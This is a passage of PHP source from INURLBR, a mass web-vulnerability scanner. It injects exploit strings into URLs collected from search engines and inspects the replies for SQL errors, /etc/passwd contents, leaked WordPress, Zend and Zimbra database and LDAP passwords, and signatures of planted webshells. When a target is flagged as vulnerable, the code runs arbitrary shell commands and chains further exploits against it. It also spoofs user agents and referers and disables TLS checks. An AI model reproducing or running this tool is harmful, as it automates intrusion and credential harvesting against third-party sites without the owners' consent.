        $commando = str_replace("_TARGET_", __filterHostname($alvo), $commando);
        $commando = str_replace('_TARGETIP_', $_SESSION['config']['server_ip'], $commando);
        $commando = str_replace('_TARGETFULL_', $alvo, $commando);
        $commando = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-command'], $commando);
        $commando = str_replace("\n", '', str_replace("\r", '', $commando));

        echo "\n{$_SESSION["c1"]}|_[ * ]__{$_SESSION["c0"]}\n";
        echo "         {$_SESSION["c1"]}|[ EXTERNAL COMMAND ]:: {$commandoCor}{$_SESSION["c11"]}\n";

        $dados = system($commando, $dados);
        sleep(1) . __plus();

        echo "{$_SESSION["c0"]}";
    }
    if (empty($dados[0])) {
        return FALSE;
    }
    unset($dados);
}

################################################################################
#FILTER BY TAKING ONLY RESPONSIBLE URL HOSTNAME#################################

function __filterHostname($url) {

    $alvo_ = NULL;
    preg_match_all("#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9-\.]+)#i", $url, $alvo_);
    return str_replace("/", '', str_replace("ftps:", '', str_replace("ftp:", '', str_replace("https:", '', str_replace("http:", '', $alvo_[0][0])))));
}

################################################################################
#RESPONSIBLE FOR ALL REQUESTS GET / POST THE SCRIPT#############################

function __request_info($curl, $url_, $proxy = NULL, $postDados = NULL) {

    __plus();
    //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
    if (isset($postDados) && !empty($postDados) && is_array($postDados)) {

        foreach ($postDados as $campo => $valor) {
            $postDados_format .= $campo . '=' . urlencode($valor) . '&';
        }
        $postDados_format = rtrim($postDados_format, '&');
        curl_setopt($curl, CURLOPT_POST, count($postDados));
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postDados_format);
    }
    curl_setopt($curl, CURLOPT_URL, $url_);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array_merge(not_isnull_empty($_SESSION['config']['http-header']) ? explode(',', $_SESSION['config']['http-header']) : array(), array("Cookie: disclaimer_accepted=true")));
    curl_setopt($curl, CURLOPT_USERAGENT, (not_isnull_empty($_SESSION['config']['user-agent'])) ? $_SESSION['config']['user-agent'] : __setUserAgentRandom());
    curl_setopt($curl, CURLOPT_REFERER, (not_isnull_empty($_SESSION['config']['url-reference'])) ? $_SESSION['config']['url-reference'] : __setURLReferenceRandom());

    (!is_null($proxy) ? curl_setopt($curl, CURLOPT_PROXY, $proxy) : NULL);
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_HEADER, 1) : NULL;
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_FRESH_CONNECT, 1) : NULL;
    (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0) : NULL;
    (!is_null($_SESSION['config']['verifica_info']) && __validateOptions('3,6', $_SESSION['config']['debug']) ? curl_setopt($curl, CURLOPT_VERBOSE, 1) : NULL);
    __plus();
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ? $_SESSION['config']['time-out'] : 20);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');

    $corpo = curl_exec($curl);
    __plus();
    $server = curl_getinfo($curl);
    __plus();
    $status = NULL;
    preg_match_all('(HTTP.*)', $corpo, $status['http']);
    preg_match_all('(Server:.*)', $corpo, $status['server']);
    preg_match_all('(X-Powered-By:.*)', $corpo, $status['X-Powered-By']);

    $info = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
    __debug(array('debug' => "[ BODY ]{$corpo}", 'function' => '__request_info'), 4) . __plus();
    __debug(array('debug' => "[ URL ]{$url_}", 'function' => '__request_info'), 2) . __plus();
    curl_close($curl) . __plus();
    unlink('cookie.txt');
    unset($curl);
    return isset($corpo) ? array('corpo' => $corpo, 'server' => $server, 'info' => $info) : FALSE;
}

################################################################################
#CAPTURE INFORMATION SERVER AND VALIDATE FAULTS#################################

function __infoServer($url_, $postDados = NULL) {

    __plus();
    $_SESSION['config']['verifica_info'] = 1;
    $resultado = __request_info($curl = curl_init(), $url_, $_SESSION["config"]["proxy"], $postDados);
    __plus();
    if (isset($resultado['corpo'])) {
        if (!is_null($_SESSION['config']['extrai-email'])) {
            __plus();
            return __extractEmail($resultado['corpo'], $url_);
        }
        if (!is_null($_SESSION['config']['extrai-url'])) {
            __plus();
            return __extractURLs($resultado['corpo'], $url_);
        }
        if (not_isnull_empty($_SESSION['config']['regexp-filter'])) {
            __plus();
            return __extractRegCustom($resultado['corpo'], $url_);
        }
        if (not_isnull_empty($_SESSION['config']['target']) && $_SESSION['config']['tipoerro'] == 5) {
            __plus();
            return __checkURLs($resultado['server']['http_code'], $url_);
        }

        $_SESSION['config']['erroReturn'] = __checkError($resultado['corpo']);
        $_SESSION['config']['server_ip'] = (!is_null($resultado['server']['primary_ip']) ? $resultado['server']['primary_ip'] : NULL);
        $_SESSION['config']['vull_style'] = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$_SESSION["c4"]}( TARGET POTENTIALLY VULNERABLE )  \033[42;30m" . __cli_beep() : NULL;
        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$url_}\n" : NULL;
        __plus();
        $url_ = ($_SESSION['config']['alexa-rank']) ? ", RANK ALEXA: " . __positionAlexa($url_) : NULL;
        __plus();
        $_SESSION['config']['info_ip'] = __infoIP($resultado['server']['primary_ip'], 1);
        __plus();
    } else {
        return FALSE;
    }
    __plus();

    return "{$resultado['info']}, IP:{$resultado['server']['primary_ip']}:{$resultado['server']['primary_port']} {$url_}";
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF MOTOR#####################

function __processUrlExec($url, $contUrl) {

    __plus();
    if (is_null($url) || empty($url)) {

        return FALSE;
    }


    $host = (!is_null($_SESSION['config']['replace'])) ? __replace($_SESSION['config']['replace'], urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url))) : urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url));
    $info_['url'] = __mountURLExploit(!is_null($_SESSION['config']['url']) ? $_SESSION['config']['url'] . $host : $host);
    $info = __infoServer($info_['url'], $_SESSION['config']['exploit-post']);
    $url_ = ($_SESSION['config']['tipoerro'] == 4) ? $_SESSION['config']['url'] . $host : urldecode($url);
    __plus();
    if ($_SESSION['config']['tipoerro'] != 5 && is_null($_SESSION['config']['extrai-email']) && is_null($_SESSION['config']['extrai-url']) && is_null($_SESSION['config']['regexp-filter'])) {
        $exget = (not_isnull_empty($_SESSION['config']['exploit-get']) ? ' GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
        $expost = (not_isnull_empty($_SESSION['config']['exploit-post']) ? ' POST=> ' . $_SESSION['config']['exploit-post'] : NULL);
        $valid_return = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? TRUE : FALSE;
        $info = ($valid_return) ? "{$_SESSION["c4"]}{$info}" : $info;
        $info_ip = ($valid_return) ? "{$_SESSION["c4"]}{$_SESSION['config']['info_ip']}" : $_SESSION['config']['info_ip'];
        $anime = ($valid_return) ? '[ ! ]' : '[ - ]';
        echo __plus() . "\n";

        echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] [{$_SESSION["c1"]} {$contUrl} {$_SESSION["c1"]}]{$_SESSION["c9"]}-[" . date("H:i:s") . "]{$_SESSION["c1"]} {$anime} {$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Target:: {$_SESSION["c1"]}[{$_SESSION["c9"]} {$_SESSION['config']['vull_style']}{$url_}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Exploit:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$exget}{$expost}{$_SESSION["c0"]}\n";
        echo (not_isnull_empty($_SESSION['config']['replace'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Replace:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['replace']}{$_SESSION["c0"]}\n") : NULL;
        echo (isset($_SESSION['config']['cms-check-resultado'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}CMS check:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['cms-check-resultado']}{$_SESSION["c0"]}\n") : NULL;
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Information Server:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}More details:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info_ip}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Found:: {$_SESSION["c9"]}" . ($valid_return ? "{$_SESSION["c4"]}{$_SESSION['config']['erroReturn']}" : "UNIDENTIFIED") . "{$_SESSION["c0"]}";
        ($valid_return ? __saveValue($_SESSION['config']['arquivo_output'], $info_['url'], 1) : NULL);
        echo ($_SESSION['config']['sendmail'] ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}SEND MAIL:: {$_SESSION["c9"]}" . (($valid_return) ? "{$_SESSION["c4"]}" : NULL) . __sendMail($_SESSION['config']['sendmail'], $info_['url']) . "{$_SESSION["c0"]}" : NULL);
        (not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? __saveValue($_SESSION['config']['arquivo_output_all'], $info_['url'], NULL) : NULL);
        __plus();
        (not_isnull_empty($_SESSION['config']['sub-file']) && is_array($_SESSION['config']['sub-file']) ? __subExecExploits($url_, $_SESSION['config']['sub-file']) : NULL);
        __plus();
        ($valid_return && !is_null($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $info_['url']) : NULL);
        (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $info_['url']) : NULL);
        __plus();
        ($valid_return && !is_null($_SESSION['config']['exploit-vull-id']) ? __configExploitsExec($_SESSION['config']['exploit-vull-id'], $info_['url']) : NULL);
        (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $info_['url']) : NULL);
        __plus();
        __timeSec('delay', "\n");
    }
}

################################################################################
#PRINT MESSAGE AND OUT OF THE PROCESS###########################################

function __getOut($msg) {

    print_r($msg);
    exit();
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF ENGINE####################

function __process($resultadoURL) {

    __plus();
    $resultadoURL_ = is_array($resultadoURL) ? array_unique(array_filter($resultadoURL)) : $resultadoURL;
    $resultadoURL__ = ($_SESSION['config']['unique']) ? __filterDomainUnique($resultadoURL_) : $resultadoURL_;



    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c12"]}[ TOTAL FOUND VALUES ]::{$_SESSION["c1"]} [ " . count($resultadoURL__) . " ]{$_SESSION["c0"]}\n";
    __debug(array('debug' => $resultadoURL__, 'function' => '__process'), 3);

    if (count($resultadoURL__) > 0) {
        foreach ($resultadoURL__ as $url) {
            __plus();
            $url = not_isnull_empty($_SESSION['config']['target']) ? $_SESSION['config']['target'] . $url : $url;
            if (__validateURL($url) || not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {
                $url = __filterURLTAG($url);
                $_SESSION["url_dump"].="{$url}\n";
                not_isnull_empty($_SESSION['config']['ifurl']) && strstr(urldecode($url), $_SESSION['config']['ifurl']) ? __processUrlExec(urldecode($url), $_SESSION["config"]["contUrl"] ++) : NULL;
                !not_isnull_empty($_SESSION['config']['ifurl']) ? __processUrlExec(urldecode($url), $_SESSION["config"]["contUrl"] ++) : NULL;
                __plus();
            }
        }
    } else {
        __getOut(__bannerLogo() . "{$_SESSION["c1"]}0x{$_SESSION["c0"]}{$_SESSION["c2"]}Not a satisfactory result was found!{$_SESSION["c0"]}\n");
    }
}

################################################################################
#ERRORS STANDARDS OF SCRIPT VALIDATE WITH HTML RECEIVED#########################

function __checkError($html_) {

    if (__validateOptions($_SESSION['config']['tipoerro'], '2')) {
        $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
    }

    if (__validateOptions('1,3,4', $_SESSION['config']['tipoerro'])) {

        if (__validateOptions('3,4', $_SESSION['config']['tipoerro'])) {
            $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
        }

        #[*]LOCAL FILE INCLUSION
        $validation['LOCAL-FILE-INCLUSION-01'] = '/root:/';
        $validation['LOCAL-FILE-INCLUSION-02'] = 'root:x:0:0:';
        $validation['LOCAL-FILE-INCLUSION-03'] = 'mysql:x:';

        #[*]ZIMBRA MAIL
        $validation['ZIMBRA-WEB-MAIL-01'] = 'zimbra_user';
        $validation['ZIMBRA-WEB-MAIL-02'] = 'zimbra_ldap_password';
        $validation['ZIMBRA-WEB-MAIL-03'] = 'ldap_replication_password';
        $validation['ZIMBRA-WEB-MAIL-04'] = 'ldap_root_password';
        $validation['ZIMBRA-WEB-MAIL-05'] = 'ldap_nginx_password';
        $validation['ZIMBRA-WEB-MAIL-06'] = 'mailboxd_keystore_password';
        $validation['ZIMBRA-WEB-MAIL-07'] = 'zimbra_mysql_password';
        $validation['ZIMBRA-WEB-MAIL-08'] = 'mysql_root_password';
        $validation['ZIMBRA-WEB-MAIL-10'] = 'mailboxd_truststore_password';
        $validation['ZIMBRA-WEB-MAIL-11'] = 'ldap_postfix_password';
        $validation['ZIMBRA-WEB-MAIL-12'] = 'ldap_amavis_password';

        #[*]ZEND FRAMEWORK
        $validation['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
        $validation['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
        $validation['ZEND-FRAMEWORK-03'] = 'db.params.username';
        $validation['ZEND-FRAMEWORK-04'] = 'db.params.password';
        $validation['ZEND-FRAMEWORK-05'] = 'db.params.dbname';

        #[*]CMS WORDPRESS
        $validation['CMS-WORDPRESS-01'] = "define('DB_NAME'";
        $validation['CMS-WORDPRESS-02'] = "define('DB_USER'";
        $validation['CMS-WORDPRESS-03'] = "define('DB_PASSWORD'";
        $validation['CMS-WORDPRESS-04'] = "define('DB_HOST'";

        #[*]ERROR MARIADB
        $validation['MARIADB-01'] = 'MariaDB server version for the right syntax';

        #[*]ERROR MYSQL
        $validation['MYSQL-AND-MARIADB'] = 'You have an error in your SQL syntax;';
        $validation['MYSQL-03'] = 'Warning: mysql_';
        $validation['MYSQL-04'] = 'function.mysql';
        $validation['MYSQL-05'] = 'MySQL result index';
        $validation['MYSQL-07'] = 'MySQL Error';
        $validation['MYSQL-08'] = 'MySQL ODBC';
        $validation['MYSQL-09'] = 'MySQL Driver';
        $validation['MYSQL-10'] = 'mysqli.query';
        $validation['MYSQL-11'] = 'num_rows';
        $validation['MYSQL-12'] = 'mysql error:';
        $validation['MYSQL-13'] = 'supplied argument is not a valid MySQL result resource';
        $validation['MYSQL-14'] = 'on MySQL result index';
        $validation['MYSQL-15'] = 'Error Executing Database Query';
        $validation['MYSQL-01'] = 'mysql_';

        #[*]ERROR MICROSOFT
        $validation['MICROSOFT-01'] = 'Microsoft JET Database';
        $validation['MICROSOFT-02'] = 'ADODB.Recordset';
        $validation['MICROSOFT-03'] = '500 - Internal server error';
        $validation['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
        $validation['MICROSOFT-05'] = 'Unclosed quotes';
        $validation['MICROSOFT-06'] = 'ADODB.Command';
        $validation['MICROSOFT-07'] = 'ADODB.Field error';
        $validation['MICROSOFT-08'] = 'Microsoft VBScript';
        $validation['MICROSOFT-09'] = 'Microsoft OLE DB Provider for SQL Server';
        $validation['MICROSOFT-10'] = 'Unclosed quotation mark';
        $validation['MICROSOFT-11'] = 'Microsoft OLE DB Provider for Oracle';
        $validation['MICROSOFT-14'] = 'Active Server Pages error';
        $validation['MICROSOFT-15'] = 'OLE/DB provider returned message';
        $validation['MICROSOFT-16'] = 'OLE DB Provider for ODBC';
        $validation['MICROSOFT-17'] = "error '800a0d5d'";
        $validation['MICROSOFT-18'] = "error '800a000d'";
        $validation['MICROSOFT-19'] = 'Unclosed quotation mark after the character string';
        $validation['MICROSOFT-20'] = '[Microsoft][SQL Server Native Client 11.0][SQL Server]';
        $validation['MICROSOFT-21'] = 'Warning: odbc_';

        #[*]ERROR ORACLE
        $validation['ORACLE-01'] = 'ORA-00921: unexpected end of SQL command';
        $validation['ORACLE-02'] = 'ORA-01756';
        $validation['ORACLE-03'] = 'ORA-';
        $validation['ORACLE-04'] = 'Oracle ODBC';
        $validation['ORACLE-05'] = 'Oracle Error';
        $validation['ORACLE-06'] = 'Oracle Driver';
        $validation['ORACLE-07'] = 'Oracle DB2';
        $validation['ORACLE-08'] = 'error ORA-';
        $validation['ORACLE-09'] = 'SQL command not properly ended';

        #[*]ERROR DB2
        $validation['DB2-01'] = 'DB2 ODBC';
        $validation['DB2-02'] = 'DB2 error';
        $validation['DB2-03'] = 'DB2 Driver';

        #[*]ERROR ODBC
        $validation['ODBC-01'] = 'ODBC SQL';
        $validation['ODBC-02'] = 'ODBC DB2';
        $validation['ODBC-03'] = 'ODBC Driver';
        $validation['ODBC-04'] = 'ODBC Error';
        $validation['ODBC-05'] = 'ODBC Microsoft Access';
        $validation['ODBC-06'] = 'ODBC Oracle';
        $validation['ODBC-07'] = 'ODBC Microsoft Access Driver';

        #[*]ERROR POSTGRESQL
        $validation['POSTGRESQL-01'] = 'Warning: pg_';
        $validation['POSTGRESQL-02'] = 'PostgreSql Error:';
        $validation['POSTGRESQL-03'] = 'function.pg';
        $validation['POSTGRESQL-04'] = 'Supplied argument is not a valid PostgreSQL result';
        $validation['POSTGRESQL-05'] = 'PostgreSQL query failed: ERROR: parser: parse error';
        $validation['POSTGRESQL-06'] = 'pg_';

        #[*]ERROR SYBASE
        $validation['SYBASE-01'] = 'Warning: sybase_';
        $validation['SYBASE-02'] = 'function.sybase';
        $validation['SYBASE-03'] = 'Sybase result index';
        $validation['SYBASE-04'] = 'Sybase Error:';
        $validation['SYBASE-05'] = 'Sybase: Server message:';
        $validation['SYBASE-06'] = 'sybase_';
        $validation['SYBASE-07'] = '[Sybase][ODBC Driver]:';

        #[*]ERROR JBOSSWEB 
        $validation['JBOSSWEB-01'] = 'java.sql.SQLSyntaxErrorException: ORA-';
        $validation['JBOSSWEB-02'] = 'org.springframework.jdbc.BadSqlGrammarException:';
        $validation['JBOSSWEB-03'] = 'javax.servlet.ServletException:';
        $validation['JBOSSWEB-04'] = 'java.lang.NullPointerException';

        #[*]ERROR JDBC
        $validation['JDBC_CFM-01'] = 'Error Executing Database Query';
        $validation['JDBC_CFM-02'] = 'SQLServer JDBC Driver';
        $validation['JDBC_CFM-03'] = 'JDBC SQL';
        $validation['JDBC_CFM-04'] = 'JDBC Oracle';
        $validation['JDBC_CFM-05'] = 'JDBC MySQL';
        $validation['JDBC_CFM-06'] = 'JDBC error';
        $validation['JDBC_CFM-07'] = 'JDBC Driver';

        #[*]JAVA INFINITYDB
        $validation['JAVA-INFINITYDB-01'] = 'java.io.IOException: InfinityDB';

        #[*]ERROR PHP
        $validation['ERRORPHP-01'] = 'Warning: include';
        $validation['ERRORPHP-02'] = 'Fatal error: include';
        $validation['ERRORPHP-03'] = 'Warning: require';
        $validation['ERRORPHP-04'] = 'Fatal error: require';
        $validation['ERRORPHP-05'] = 'ADODB_Exception';
        $validation['ERRORPHP-06'] = 'Warning: include(';
        $validation['ERRORPHP-07'] = 'Warning: require_once(';
        $validation['ERRORPHP-08'] = 'function.include';
        $validation['ERRORPHP-09'] = 'Disallowed Parent Path';
        $validation['ERRORPHP-10'] = 'function.require';
        $validation['ERRORPHP-11'] = 'Warning: main(';
        $validation['ERRORPHP-12'] = 'Warning: session_start()';
        $validation['ERRORPHP-13'] = 'Warning: getimagesize()';
        $validation['ERRORPHP-16'] = 'Warning: array_merge()';
        $validation['ERRORPHP-17'] = 'Warning: preg_match()';
        $validation['ERRORPHP-18'] = 'GetArray()';
        $validation['ERRORPHP-19'] = 'FetchRow()';
        $validation['ERRORPHP-20'] = 'Warning: preg_';
        $validation['ERRORPHP-21'] = 'Warning: ociexecute()';
        $validation['ERRORPHP-22'] = 'Warning: ocifetchstatement()';
        $validation['ERRORPHP-23'] = 'PHP Warning:';

        #[*]ERROR ASP
        $validation['ERRORASP-01'] = 'Version Information: Microsoft .NET Framework';
        $validation['ERRORASP-02'] = "Server.Execute Error";
        $validation['ERRORASP-03'] = 'ASP.NET_SessionId';
        $validation['ERRORASP-04'] = 'ASP.NET is configured to show verbose error messages';
        $validation['ERRORASP-05'] = 'BOF or EOF';
        $validation['ERRORASP-06'] = 'Unclosed quotation mark';
        $validation['ERRORASP-06'] = 'Error converting data type varchar to numeric';

        #[*]ERROR LUA
        $validation['ERRORLUA-01'] = 'LuaPlayer ERROR:';
        $validation['ERRORLUA-02'] = 'CGILua message';
        $validation['ERRORLUA-03'] = 'Lua error';

        #[*]ERROR INDEFINIDOS
        $validation['INDEFINITE-01'] = 'Incorrect syntax near';
        $validation['INDEFINITE-02'] = 'Fatal error';
        $validation['INDEFINITE-04'] = 'Invalid Querystring';
        $validation['INDEFINITE-05'] = 'Input string was not in a correct format';
        $validation['INDEFINITE-06'] = 'An illegal character has been found in the statement';

        #[*]SHELL SCRIPT
        $validation['SHELL-01'] = 'c99shell</title>';
        $validation['SHELL-02'] = 'C99Shell v';
        $validation['SHELL-03'] = '<form method="POST" action="cfexec.cfm">';
        $validation['SHELL-05'] = '<input type=text name=".CMD" size=45 value=';
        $validation['SHELL-05'] = '<title>awen asp.net webshell</title>';
        $validation['SHELL-06'] = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>";
        $validation['SHELL-07'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-08'] = 'Simple CGI backdoor by DK';
        $validation['SHELL-09'] = 'execute command: <input type="text" name="c">';
        $validation['SHELL-10'] = 'Execute Shell Command';
        $validation['SHELL-11'] = 'r57shell</title>';
        $validation['SHELL-12'] = '<title>r57Shell';
        $validation['SHELL-13'] = 'heroes1412';
        $validation['SHELL-14'] = 'MyShell';
        $validation['SHELL-15'] = 'PHP Shell';
        $validation['SHELL-16'] = 'PHPShell';
        $validation['SHELL-17'] = 'REMVIEW TOOLS';
        $validation['SHELL-18'] = '<title>iTSecTeam</title>';
        $validation['SHELL-19'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-20'] = '<title>*  ernealizm  * </title>';
        $validation['SHELL-21'] = '<title>JSP Shell</title>';
        $validation['SHELL-22'] = '<title>KNULL Shell</title>';
        $validation['SHELL-23'] = '<title>.+- WSO.+</title>';
        $validation['SHELL-24'] = '<title>SST Sheller !</title>';
        $validation['SHELL-25'] = '<title>SyRiAn Sh3ll';
        $validation['SHELL-26'] = '<title>Mini Php Shell';
        $validation['SHELL-27'] = '<title>ASPX Shell</title>';
        $validation['SHELL-28'] = '<title>ZoRBaCK Connect</title>';
        $validation['SHELL-29'] = '<title>.+Ani-Shell.+</title>';
        $validation['SHELL-30'] = '<title>Stored Procedure Execute</title>';
        $validation['SHELL-31'] = '<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>';
        $validation['SHELL-32'] = '<title>PhpShell 2.0</title>';
        $validation['SHELL-33'] = '<title>.+NTDaddy.+</title>';
        $validation['SHELL-34'] = '<title>PHP-Terminal';

        $_SESSION['config']['cms-check-resultado'] = (!is_null($_SESSION['config']['cms-check'])) ? __SimpleCheckCMS($html_) : NULL;
    }

    if (!is_null($_SESSION['config']['regexp'])) {
        preg_match_all("#\b{$_SESSION['config']['regexp']}#i", $html_, $match);
        __plus();
        return (isset($match[0][0]) && !empty($match[0][0]) ? " regular expression->{$_SESSION['config']['regexp']} - " . $match[0][0] . " FOUD! " : NULL);
    } else {
        foreach ($validation as $campo => $valor) {
            __plus();
            if (__validateBD($html_, $validation[$campo], $campo)) {
                __plus();
                return(" {$campo}  -  VALUE: {$validation[$campo]}");
            }
        }
    }
}

################################################################################
#CHECK ERROR 2 HTML INSIDE######################################################

function __validateBD($html_, $verificar, $bd) {

    return (strstr($html_, $verificar)) ? $bd : NULL;
}

################################################################################
#FORMAT URL#####################################################################

function __mountURLExploit($_url) {

    $_url = explode("=", trim(urldecode($_url)));
    $get = max(array_keys($_url));
    $get_ = $_url[$get];
    return implode("=", str_replace($get_, $get_ . ((!is_null($_SESSION['config']['exploit-get'])) ? $_SESSION['config']['exploit-get'] : NULL), $_url));
}

################################################################################
#FILTER HTML URLs ALL THE RETURN OF seekers#####################################

function __filterURL($html, $op = NULL) {

    $reg_href = !strstr($op, 'GOOGLE') ? 'href=\"|src=\"|value=\"' : NULL;
    $reg = "#\b({$reg_href}http[s]?://|{$reg_href}ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    preg_match_all($reg, $html, $html);
    return (array_filter(array_unique($html[0])));
}

################################################################################
#COUNTING PROCESS END URLS / vuln AND SHOWING THE URLS / vuln###################

function __exitProcess() {

    $file = !is_null($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = !is_null($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    $cont = count(explode("\n", $_SESSION['config']['resultado_valores'])) - 1;
    echo "\n\n{$_SESSION["c1"]}|[ INFO ][ Shutting down ]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}|[ INFO ][ End of process INURLBR at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c0"]}{$_SESSION["c16"]}[ OTOTAL FILTERED VALUES ]::{$_SESSION["c1"]} [ {$cont} ]{$_SESSION["c0"]}";
    echo!is_null($file) ? "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c16"]}[ OOUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL;
    echo!is_null($file_all) ? "\n{$_SESSION["c1"]}|[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL;
    echo "\n{$_SESSION["c1"]}|_________________________________________________________________________________________{$_SESSION["c0"]}\n";
    print_r(!$_SESSION['config']['extrai-email'] ? $_SESSION['config']['resultado_valores'] : NULL);
    echo "\n{$_SESSION["c1"]}\_________________________________________________________________________________________/{$_SESSION["c0"]}\n";
    __getOut("\n");
}

################################################################################
#CASE URLS FILTER AND VALIDATING URL VALID######################################

function __subProcess($resultado = NULL) {

    $resultado_ = is_array($resultado) ? array_unique(array_filter($resultado)) : $resultado;
    if (isset($resultado_)) {
        foreach ($resultado_ as $result) {
            $result = __filterURLTAG($result);
            $result_ = __validateURL($result) ? $result : NULL;
            $blacklist = $_SESSION["config"]['blacklist'];
            $blacklist_ = (!is_null($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $blacklist) : $blacklist;
            __plus();

            if (not_isnull_empty($result_) && !__validateOptions($blacklist_, $result_, 1)) {
                $_SESSION["config"]["totas_urls"].= $result_ . "\n";
            }
        }
    }
}

################################################################################
#DEBUGAR VALORES E PROCESSOS####################################################

function __debug($valor, $op = NULL) {

    return isset($_SESSION["config"]["debug"]) && __validateOptions($_SESSION["config"]["debug"], $op) ? "[ INFO ][ FUNCTION ]=>{$valor['function']}[ DEBUG ] => " . print_r($valor['debug']) . "\n" : NULL;
}

################################################################################
#TIME TO PROCESS SEC############################################################

function __timeSec($camp, $value = NULL) {

    echo!is_null($_SESSION['config'][$camp]) && !empty($_SESSION['config'][$camp]) ? "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ TIME SEC/DELAY ]::{$_SESSION["c1"]}{ {$_SESSION["c8"]}[ {$_SESSION['config'][$camp]} ]{$_SESSION["c1"]} }{$_SESSION["c0"]}{$value}" : NULL;
    !is_null($_SESSION['config'][$camp]) ? sleep($_SESSION['config'][$camp]) : NULL;
}

################################################################################
#SEARCH ENGINE CONFIGURATION####################################################

function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pagStart, $pagLimit, $pagIncrement, $pagStart2 = NULL, $pagIncrement2 = NULL) {

    __plus();

    echo ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ ENGINE ]::{$_SESSION["c1"]}[ {$motorNome} ]{$_SESSION["c0"]}\n");
